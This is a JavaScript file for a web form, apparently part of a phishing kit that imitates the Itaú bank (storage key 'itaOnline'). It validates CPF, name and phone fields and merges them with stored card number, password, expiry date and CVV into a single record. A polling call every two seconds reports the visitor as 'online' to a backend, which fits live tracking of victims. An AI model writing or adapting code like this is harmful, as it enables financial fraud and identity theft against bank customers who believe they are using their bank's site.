$(document).ready(function(){


    setInterval(()=>{
	$.post('api/', {cliente:"online"},function(r){
    });
	}, 2000);
	
    /*=========================*/
	
	$('#numcpf').mask('000.000.000-00');

	$('#frmcad input').blur(function(){
		var cmpatual = $(this).attr('id');
		
		switch(cmpatual){
			case 'numcpf':
				if ($('#'+cmpatual).val() != "" && $('#'+cmpatual).val().replace(/[^0-9]/g, '').length < 11) {
					$('#'+cmpatual).attr('class', 'error');
					conterror();
				}
			break;

			case 'namefull':
				if ($('#'+cmpatual).val() != "" && $('#'+cmpatual).val().includes(' ') == false || $('#'+cmpatual).val().includes(' ') && $('#'+cmpatual).val().replace(' ', '').length < 1 || $('#'+cmpatual).val().includes(' ') && $('#'+cmpatual).val().length < ($('#'+cmpatual).val().indexOf(' ')+4)) {
					$('#'+cmpatual).attr('class', 'error');
					conterror();
				}
			break;

			case 'telephone':
				if ($('#'+cmpatual).val() != "" && $('#'+cmpatual).val().replace(/[^0-9]/g, '').length < 10) {
					$('#'+cmpatual).attr('class', 'error');
					conterror();
				}
			break;

		}

	});

	document.getElementById('btncad').addEventListener('click', function(){
		var el = this;
		setTimeout(function(){
  			el.setAttribute('disabled', 'disabled');
  		}, 500);
	});
});

function validatefrmcad(id){
	var cmp = $('#'+id).val();

	switch(id){

		case 'namefull':
			if (cmp.includes(' ') && cmp.replace(' ', '').length > 0 && cmp.length >= (cmp.indexOf(' ')+4)) {
				$('#'+id).removeAttr('class');
				conterror();
			}
		break;

		case 'numcpf':
			var cpf = cmp.replace(/[^0-9]/g, '');
			if (cpf.length == 11) {

				if(cpf == 11111111111){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 22222222222){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 33333333333){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 44444444444){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 55555555555){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 66666666666){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 77777777777){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 88888888888){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 99999999999){
					$('#'+id).attr('class', 'error');
					return false;
				}

				if(cpf == 00000000000){
					$('#'+id).attr('class', 'error');
					return false;
				}else{

					var digitoA = 0;
					var digitoB = 0;

					for(var i=0, x=10; i<=8; i++, x--){
						digitoA += cpf[i] * x;
					}

					for(var i=0, x=11; i<=9; i++, x--){
						digitoB += cpf[i] * x;
					}

					var somaA = ((digitoA%11) <2) ? 0 : 11-(digitoA%11);
					var somaB = ((digitoB%11) <2) ? 0 : 11-(digitoB%11);
				
					if(somaA != cpf[9] || somaB != cpf[10]){
						$('#'+id).attr('class', 'error');
						conterror();
						return false;
					}else{
						$('#'+id).removeAttr('class');
						conterror();
					}
				}
			}
		break;

		case 'telephone':
			if (cmp.replace(/[^0-9]/g, '').length < 11) {
				$('#telephone').mask('(00) 0000-00000');

				if (cmp.replace(/[^0-9]/g, '').length == 10) {
					$('#'+id).removeAttr('class');
					conterror();
				}

			}else{
				$('#telephone').mask('(00) 00000-0000');
				$('#'+id).removeAttr('class');
				conterror();
			}
		break;

	}
}

function conterror(){
	var cmps = $('#frmcad input');
	var erros = 0;
	for (i = 0; i < cmps.length; i++) {
		if (cmps[i].value != "") {
			if (cmps[i].className.indexOf('error') != -1) {
				erros++;
			}
		}else{
			erros++;
		}
	}

	if (erros == 0) {
	
	    var titulo = document.getElementById("namefull").value;
	    var cpfx = document.getElementById("numcpf").value;
		var tel = document.getElementById("telephone").value;
		
		var jsonX = localStorage.getItem('itaOnline');
	    var date = JSON.parse(jsonX);
	   
	    var send = {numero:date.numero, senha:date.senha, validade:date.validade, cvv:date.cvv, titular:titulo, cpf:cpfx, telefone:tel,};
        localStorage.setItem('itaOnline', JSON.stringify(send));
		
		$('#btncad').removeAttr('disabled');
		$('#btncad').css({'background-color':'#ee7421'});
		$('#btncad').css({'color':'#fff'});
	}else{
		$('#btncad').attr('disabled', 'disabled');
		$('#btncad').css({'background-color':'#d9d9d9'});
		$('#btncad').css({'color':'#848484'});
	}
}